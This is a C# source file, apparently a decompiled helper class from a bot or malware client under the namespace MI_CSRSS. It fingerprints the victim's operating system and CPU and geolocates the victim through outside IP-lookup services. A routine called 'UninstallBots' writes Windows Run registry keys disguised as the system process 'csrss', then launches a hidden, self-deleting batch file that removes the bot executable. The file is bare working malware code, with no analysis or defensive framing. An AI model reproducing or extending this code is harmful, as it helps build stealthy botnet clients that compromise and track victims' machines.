using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;

namespace MI_CSRSS;

internal class Misc
{
	internal struct SYSTEM_INFO
	{
		public ushort wProcessorArchitecture;

		public ushort wReserved;

		public uint dwPageSize;

		public IntPtr lpMinimumApplicationAddress;

		public IntPtr lpMaximumApplicationAddress;

		public UIntPtr dwActiveProcessorMask;

		public uint dwNumberOfProcessors;

		public uint dwProcessorType;

		public uint dwAllocationGranularity;

		public ushort wProcessorLevel;

		public ushort wProcessorRevision;
	}

	internal const ushort PROCESSOR_ARCHITECTURE_INTEL = 0;

	internal const ushort PROCESSOR_ARCHITECTURE_IA64 = 6;

	internal const ushort PROCESSOR_ARCHITECTURE_AMD64 = 9;

	internal const ushort PROCESSOR_ARCHITECTURE_UNKNOWN = ushort.MaxValue;

	public static string GetOperSys()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		string text = "Unknown";
		switch (oSVersion.Platform)
		{
		case PlatformID.Win32Windows:
			switch (oSVersion.Version.Minor)
			{
			case 90:
				text = "Windows ME";
				break;
			case 10:
				text = "Windows 98";
				break;
			case 0:
				text = "Windows 95";
				break;
			}
			break;
		case PlatformID.Win32NT:
			switch (oSVersion.Version.Major)
			{
			case 3:
				text = "Windows NT3";
				break;
			case 4:
				text = "Windows NT4";
				break;
			case 5:
				switch (oSVersion.Version.Minor)
				{
				case 0:
					text = "Windows Server 2000";
					break;
				case 1:
					text = "Windows XP";
					break;
				case 2:
					text = "Windows Server 2003";
					break;
				}
				break;
			case 6:
				switch (oSVersion.Version.Minor)
				{
				case 0:
					text = "Windows Vista";
					break;
				case 1:
					text = "Windows Seven";
					break;
				}
				break;
			}
			break;
		}
		return text + " " + GetPlatform();
	}

	public static string GetUserLocation()
	{
		try
		{
			string text = new StreamReader(WebRequest.Create("http://ipinfodb.com/ip_query_country.php").GetResponse().GetResponseStream()).ReadToEnd();
			return text.Substring(text.IndexOf("<CountryCode>") + "<CountryCode>".Length, text.IndexOf("</CountryCode>") - (text.IndexOf("<CountryCode>") + "<CountryCode>".Length));
		}
		catch
		{
			string text2 = new StreamReader(WebRequest.Create("http://api.hostip.info/").GetResponse().GetResponseStream()).ReadToEnd();
			return text2.Substring(text2.IndexOf("<countryAbbrev>") + "<countryAbbrev>".Length, text2.IndexOf("</countryAbbrev>") - (text2.IndexOf("<countryAbbrev>") + "<countryAbbrev>".Length));
		}
	}

	public static void UninstallBots()
	{
		string text = Environment.GetEnvironmentVariable("appdata") + "\\" + Config.id + ".exe";
		try
		{
			Registry.LocalMachine.OpenSubKey("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", writable: true)!.SetValue("csrss", text);
		}
		catch
		{
		}
		try
		{
			Registry.CurrentUser.OpenSubKey("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", writable: true)!.SetValue("csrss", text);
		}
		catch
		{
		}
		if (File.Exists(text))
		{
			StreamWriter streamWriter = new StreamWriter("del1.bat");
			streamWriter.WriteLine("@echo off");
			streamWriter.WriteLine(":a");
			streamWriter.WriteLine("del \"" + text + "\"");
			streamWriter.WriteLine("IF EXIST \"" + text + "\" GOTO a");
			streamWriter.WriteLine("del %0");
			streamWriter.Close();
			Process process = new Process();
			process.EnableRaisingEvents = false;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.FileName = "del1.bat";
			process.Start();
		}
		Thread.Sleep(1000);
		Process.GetCurrentProcess().Kill();
	}

	[DllImport("kernel32.dll")]
	internal static extern void GetNativeSystemInfo(ref SYSTEM_INFO lpSystemInfo);

	private static string GetPlatform()
	{
		SYSTEM_INFO lpSystemInfo = default(SYSTEM_INFO);
		GetNativeSystemInfo(ref lpSystemInfo);
		return lpSystemInfo.wProcessorArchitecture switch
		{
			9 => "X64", 
			0 => "X86", 
			_ => "Unknown", 
		};
	}
}
